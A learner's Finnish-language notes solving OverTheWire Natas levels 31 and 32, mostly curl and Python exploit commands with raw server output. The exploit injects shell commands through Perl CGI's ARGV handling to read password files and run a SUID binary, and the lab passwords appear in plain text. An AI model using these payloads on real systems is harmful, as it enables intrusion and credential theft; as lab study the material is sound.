        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

```


#  curl -H 'Authorization: Basic bmF0YXMzMTpoYXk3YWVjdXVuZ2l1S2FlenVhdGh1azliaWluMHB1MQ==' -H 'Content-Type: multipart/form-data; boundary=123abc' -d $'--123abc\r\nContent-Disposition: form-data; name="file";\r\nContent-Type: text/plain\r\n\r\nARGV\r\n--123abc\r\nContent-Disposition: form-data; name="file"; filename="ttt.csv"\r\nContent-Type: application/octet-stream\r\n\r\n1,2,3\r\n\r\n\r\n--123abc\r\nContent-Disposition: form-data; name="submit"\r\n\r\nUpload\r\n---123abc--\r\n'  http://natas31.natas.labs.overthewire.org/index.pl?cat%20/etc/natas_webpass/natas32%20%7C



curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y "http://natas31.natas.labs.overthewire.org/index.pl" -F "submit=Upload" -F "file=@natas31.csv;type=text/csv"


```
┌──(kali㉿kali)-[~]
└─$ curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y "http://natas31.natas.labs.overthewire.org/index.pl?etc/natas_webpass/natas32" -F "file=ARVG" -F "file=/Downloads/book1.csv"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

```


```
┌──(kali㉿kali)-[~]
└─$ curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y "http://natas31.natas.labs.overthewire.org/index.pl" -F "submit=Upload" -F "file=Downloads/Book1.csv;type=text/csv" 
```

curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y \
  -F "submit=Upload" \
  -F "file=@Book1.csv;type=text/csv" \
  http://natas31.natas.labs.overthewire.org/index.pl



```
┌──(kali㉿kali)-[~]
└─$ curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y \
  -F "submit=Upload" \
  -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv" \
  http://natas31.natas.labs.overthewire.org/index.pl
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>asdf
</th></tr><tr><td>1234
</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y \
  -F "submit=Upload" \
  -F "file=|cat /etc/natas_webpass/natas32" \
  http://natas31.natas.labs.overthewire.org/index.pl



Tää on se toimiva skripti osuus, eli alemmaksi menee nin se toimii, tässä kali linux ohjelman alle laitoin "Book1.csv" excel taulukon normi copy-paste.

```
┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ cat pythonkoodi31.py
#!/usr/bin/env python3
import requests

auth = ('natas31', 'm7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y')
base_url = 'http://natas31.natas.labs.overthewire.org/index.pl'

# Komentoinjektio URL:iin
url = base_url + '?cat+/etc/natas_webpass/natas32+|'

# Lähetetään parametri file=ARGV (triggeröi komentoinjektion Perlin <ARGV>-käsittelyyn)
data = {'file': 'ARGV'}

# Tiedosto joka lähetetään (sisällöllä ei ole väliä, mutta sen on oltava olemassa!)
files = {'file': open('/home/kali/Downloads/Book1.csv', 'r')}  # <- muokkaa polku tarpeen mukaan

# POST-pyyntö CGI:lle
resp = requests.post(url, auth=auth, data=data, files=files)

# Tulostetaan palvelimen vastaus
print(resp.text)
```


toimiva versio (aikaisempi python skriptissä oli kirjoitus virhettä ja tässä piti määrittää toi polku)
```
┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ python pythonkoodi31.py
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


**TOINEN METHODI**, 
en uskonut tämäkin toimii mutta piti apua saada chatgpt:ltä ehdottomasti, koska testataan curl komentoa:
```
┌──(kali㉿kali)-[~]
└─$ curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y \
  -F "submit=Upload" \
  -F "file=ARGV" \
  -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv" \
  "http://natas31.natas.labs.overthewire.org/index.pl?cat+/etc/natas_webpass/natas32+|"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```




## pieni yhteenveto ja tutkiminen

Natas31:ssä kyse on nimenomaan Perl CGI -skriptin haavoittuvuudesta, joka liittyy tiedoston käsittelyyn ja komentoinjektioon


Kyseessä on **Remote Code Execution (RCE)** haavoittuvuus, joka syntyy siitä, että käyttäjän syötettä (parametria file) käytetään suoraan tiedoston lukemiseen ilman tarkistusta:
```
my $file = $cgi->param('file');
while (<$file>) {
   ...
}
```

ongelmana:
- Perl CGI käyttää käyttäjän syötettä suoraan tiedoston lukemiseen.
- Perl käsittelee tietyt merkkijonot, kuten `|komento`, erityisesti: se ajaa ne komentona.
- `file=ARGV` pakottaa Perlin lukemaan komentorivin argumentteja tiedostoina.
- Jos samalla URL:issa on injektoitu `|cat ...`, Perl suorittaa sen komentona.
- Tämä on klassinen **command injection** -haavoittuvuus, johtuen puutteellisesta syötteen validoinnista.


Jos testaisi toimisiko tämä hyökkäys pelkästään URL-injektiona, ilman tiedoston latausta, ja voiko tätä ajatella lineaarisesti:
- vastauksena: Ei, pelkkä URL-injektio ei riitä tässä tapauksessa – tiedoston lähettäminen (multipart/form-data) on välttämätöntä, jotta Perl CGI suostuu käsittelemään `file=...` niin kuin se tekee tässä haavoittuvuudessa.


Kuitenkin Natas31-harjoituksen ideana on hyödyntää CGI-skriptin haavoittuvuutta, jossa tiedoston latauksen yhteydessä voidaan suorittaa komentoinjektio. Käyttämällä esim. Burp Suitea, Python skriptillä tai curl-komentoa sekä satunnaista .csv-tiedostoa, voidaan ohittaa normaali toiminta ja suorittaa palvelimella komento, joka paljastaa natas32-tason salasanan.


## harjoitus ja lisätietoa links

https://learnhacking.io/overthewire-natas-level-31-walkthrough/


https://miaxu-src.github.io/natas/2021/09/17/natas31-walkthrough.html


https://lioxliu.wordpress.com/2020/12/27/overthewire-natas-level-31/


---

# natas 32 - start here;

natas32 : NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B


Alkuun natas 32 mukaan näyttää normaalilta, et vähä kuin natas 31 tason mukaan - voi olla vähä vaikeampi tasoinen. Upotin saman aikaisemman excel .csv taulukon et luki sisäisen taulukkon jutunsa lävitse ja toisti mitä siellä excel taulukkossa lukeekaan.

Tarkistettuna view source html voi olla pikkasen uutta/muokattua/parannettua versiota - voiko olla sama tiedoston injektio tyyppinen taso?



## pieni teoria

Koskien view-source html:ää, mitä tässä koodissa lukekaan.

Kyseessä on Perl CGI-skripti, joka tarjoaa yksinkertaisen web-sivun, jossa voi ladata CSV-tiedoston, ja sitten se muuntaa CSV:n HTML-taulukoksi. Taulukko on myös lajiteltava (`sortable`) ja tyylitelty Bootstrapilla.


Pientä yksityiskohtaa:
- Skripti asettaa ympäristömuuttujan `$ENV{'TMPDIR'}` väliaikaistiedostojen hakemistoksi (tähän `/var/www/natas/natas32/tmp/`).
- CGI moduulia käytetään lomaketietojen käsittelyyn.
-tämä eroaa natas 31 aikaisemman tason, koska siellä saattoi lukea tiedostoa suoraan tai suorittaa komentoja suoraan GET-parametrillä.
- Tässä natas32:ssa pitää käyttää palvelimen binääriä, koska salasana on suojattu tiedoston oikeuksilla eli toisin sanoen on vähä parannettu "privilege escalation" tyyppinen taso. Kertauksena **natas31** oli tiedostojen upottamisen injektio keino, mutta nyt on kyseessä parannettu versio ja oikeuden taso.



## Kali linux 

Kali linux tarkistusta

natas32 : NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B


curl http://natas32.natas.labs.overthewire.org/ --user natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B

$curl -Headers "Referer: http://natas33.natas.labs.overthewire.org/" http://natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B@natas32.natas.labs.overthewire.org



```
┌──(kali㉿kali)-[~]
└─$ curl http://natas32.natas.labs.overthewire.org/ --user natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.
    <br><br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

```
┌──(kali㉿kali)-[~]
└─$ curl -Headers "Referer: http://natas33.natas.labs.overthewire.org/" http://natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B@natas32.natas.labs.overthewire.org
curl: (3) URL rejected: Malformed input to a URL function
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.
    <br><br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas33" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"

tämä on se aikaisempi komento natas31:stä, mutta pientä muutosta ja ohjeiden mukaan haettu ja testataan. tässä tapahtui siis curl mikä käyttis (`-u`) username:password, sitten nettisivuston url ja polku /etc/ josta haettaan seuraava natas33:sen salasanansa. File ARGV joka on se suorittaa ohjauksensa *PERL CGI:tä* käyttämällä komentoriviparametriä tähän tiedostoa ja haluamme kokeilla uudestaan tätä olemassa olevaa excel tauluko tiedoston upottamisen injektiota.

URL-osoitteessa viitataan /etc/-hakemistoon ja yritetään hakea seuraavan tason (natas33) salasanaa.

Tiedostonimessä käytetään ARGV, joka ohjaa Perl CGI -skriptiä käyttämään sitä komentoriviparametrina.

Tarkoitus on kokeilla uudelleen tätä aikaisemmin toiminutta tiedoston upottamiseen perustuvaa injektiota, jossa käytetään valmiina olevaa Excel-muotoista CSV-tiedostoa.

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas33" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?ls%20-l%20.%20|" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"

Nyt tässä suoritettiin sama kuin aikaisempi komento, mutta kummottiin jälkimmäisestä osasta kuin `index.pl?` eteenpäin jossa sijoitetin jotakin **linux komentojen injection parametriä**. 

Tulostuksena ainakin näyttävän Linux kirjastojen/tiedostojen oikeuksia, root ja jne, että koska luotu ja aika ja tässä osassa meitä kiinnostaa `</td></tr><tr><td>-rwsrwx--- 1 root    natas32 16096 Aug 15 13:06 getpassword`

- `ls%20-l%20.%20|`, joka vastaa komentoa `ls -l .`
- Tämä näyttää nykyisen hakemiston sisällön pitkällä listauksella (mm. tiedosto-oikeudet ja omistajat). Tällä varmistan, että komentojen suoritus toimii ja että getpassword-tiedosto on olemassa ja SUID-root.

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?ls%20-l%20.%20|" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>.:
</th></tr><tr><td>total 156
</td></tr><tr><td>drwxr-x--- 5 natas32 natas32  4096 Aug 15 13:06 bootstrap-3.3.6-dist
</td></tr><tr><td>-rwsrwx--- 1 root    natas32 16096 Aug 15 13:06 getpassword
</td></tr><tr><td>-rw-r--r-- 1 root    root     9740 Aug 15 13:06 index-source.html
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32  2968 Aug 15 13:06 index.pl
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 97180 Aug 15 13:06 jquery-1.12.3.min.js
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 16877 Aug 15 13:06 sorttable.js
</td></tr><tr><td>drwxr-x--- 2 natas32 natas32  4096 Sep 14 13:03 tmp
</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


Nyt alkoi pelittää, koska aikaisemmassa (ylempi komento) testauksessa , niin meitä kiinnostaa toi polku **(./getpassword)** niin tähän polkuun url `/index.pl?` jälkeen pitää vähä rakentaa, jotta se alkaa pelittää siksi mentiin näin.

Tässä koskien tätä polku hakemistoa **(./getpassword)** - miksi suoritettiin näin: `./getpassword%20|` vs `./getpassword`
- %20 tarkoittaa välilyöntiä (spaec) URL muodossa ja se on URL enkoodattu siksi menee näin ja mukaan jos shellissä menisi näin `./getpassword |`
- Putki osalta tarkoittaa komennon ulostulon eteenpäin - ja todennäköisesti CGI skriptin kautta näkyviin.
- Putki on tärkeä osa, koska Unix-shellissä ja se ohjaa vasemman puolen komennon ulostulon oikean puolen syötteeksi.

Entä jos `./getpassword` ja ilman %`20|` ei toimi näkyvästi?
- silloin skripti saattaa tuoda mahdollisesti suorittaa binääri muodossa
- tulos ei ohjaudu näkyviin, vaan menee prosessiin tai jää hukkaan
- binääri **saattaa tulostaa binääristä dataa**, mikä voi aiheuttaa terminaaliin syntax error virhe ilmoituksena näin `Warning: Binary output can mess up your terminal...` ja curl varoittaa, että tulos ei ole tavallista tekstiä.

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B


curl -X POST "http://natas32.natas.labs.overthewire.org/index.pl?cat%20%2Fetc%2Fnatas_webpass%2Fnatas33%20%7C" \
  -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B \
  -F 'file=ARGV' \
  -F 'file=@/home/kali/Downloads/Book1.csv;type=text/csv' \
  -F 'submit=Upload'

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST "http://natas32.natas.labs.overthewire.org/index.pl?cat%20%2Fetc%2Fnatas_webpass%2Fnatas33%20%7C" \
  -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B \
  -F 'file=ARGV' \
  -F 'file=@/home/kali/Downloads/Book1.csv;type=text/csv' \
  -F 'submit=Upload'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


## miniyhteenveto - 1

